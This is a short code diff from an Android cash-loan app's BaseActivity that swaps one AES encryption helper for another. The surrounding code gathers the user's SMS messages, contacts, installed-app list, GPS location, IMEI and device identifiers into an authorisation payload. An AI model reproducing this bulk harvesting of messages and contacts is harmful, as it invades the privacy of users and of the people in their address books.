@@ -18,12 +18,12 @@ import com.alibaba.fastjson.JSON;
 import com.githang.statusbar.StatusBarCompat;
 import com.tiny.cash.loan.card.KudiCreditApp;
 import com.tiny.cash.loan.card.Constants;
+import com.tiny.cash.loan.card.collect.EncodeUtils;
 import com.tiny.cash.loan.card.kudicredit.R;
 import com.tiny.cash.loan.card.ui.bean.ContactInfo;
 import com.tiny.cash.loan.card.ui.bean.InstallPackageInfo;
 import com.tiny.cash.loan.card.ui.bean.SmsInfo;
 import com.tiny.cash.loan.card.ui.dialog.fragment.ProgressDialogFragment;
-import com.tiny.cash.loan.card.utils.AESUtil;
 import com.tiny.cash.loan.card.utils.ActivityCollector;
 import com.tiny.cash.loan.card.utils.CommonUtils;
 import com.tiny.cash.loan.card.utils.DeviceInfo;
@@ -139,20 +139,20 @@ public class BaseActivity extends AppCompatActivity {
         ;
         params = new AuthParams();
         if (smsInfo!=null) {
-            params.setSms(smsInfo.size() > 0 ? AESUtil.encryptAES(JSON.toJSON(smsInfo).toString()) : "");
+            params.setSms(smsInfo.size() > 0 ? EncodeUtils.Companion.encryptAES(JSON.toJSON(smsInfo).toString()) : "");
         }
 //        params.setCall(callInfos);
         if (contactInfos!=null) {
-            params.setContacts(contactInfos.size() > 0 ? AESUtil.encryptAES(JSON.toJSON(contactInfos).toString()) : "");
+            params.setContacts(contactInfos.size() > 0 ? EncodeUtils.Companion.encryptAES(JSON.toJSON(contactInfos).toString()) : "");
         }
         if (installedPackages!=null) {
-            params.setAppList(installedPackages.size() > 0 ? AESUtil.encryptAES(JSON.toJSON(installedPackages).toString()) : "");
+            params.setAppList(installedPackages.size() > 0 ? EncodeUtils.Companion.encryptAES(JSON.toJSON(installedPackages).toString()) : "");
         }
         params.setAndroidId(androidId);
         params.setBrand(brand);
         params.setDeviceUniqId(deviceId);
         if (addressbyGeoPoint!=null) {
-            params.setGps(addressbyGeoPoint.size() > 0 ? AESUtil.encryptAES(JSON.toJSON(addressbyGeoPoint).toString()) : "");
+            params.setGps(addressbyGeoPoint.size() > 0 ? EncodeUtils.Companion.encryptAES(JSON.toJSON(addressbyGeoPoint).toString()) : "");
         }
         params.setImei(imei);
         params.setInnerVersionCode(verCode);
